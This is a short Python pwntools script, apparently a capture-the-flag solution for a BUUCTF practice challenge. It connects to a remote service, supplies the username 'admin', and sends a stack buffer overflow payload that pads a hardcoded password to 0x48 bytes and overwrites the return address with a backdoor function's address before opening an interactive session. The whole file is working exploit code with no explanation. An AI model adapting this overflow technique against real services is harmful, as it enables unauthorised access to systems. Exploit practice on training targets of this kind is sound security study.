from pwn import *

r = remote('node5.buuoj.cn', 26463)
context.log_level = 'debug'

backdoor_addr = 0x400E88

r.sendlineafter(b'username: ', b'admin')

# 参考文章：https://www.52pojie.cn/thread-1825021-1-1.html
payload = b'2jctf_pa5sw0rd'.ljust(0x48, b'\x00') + p64(backdoor_addr)
r.sendlineafter(b'password: ', payload)
r.interactive()
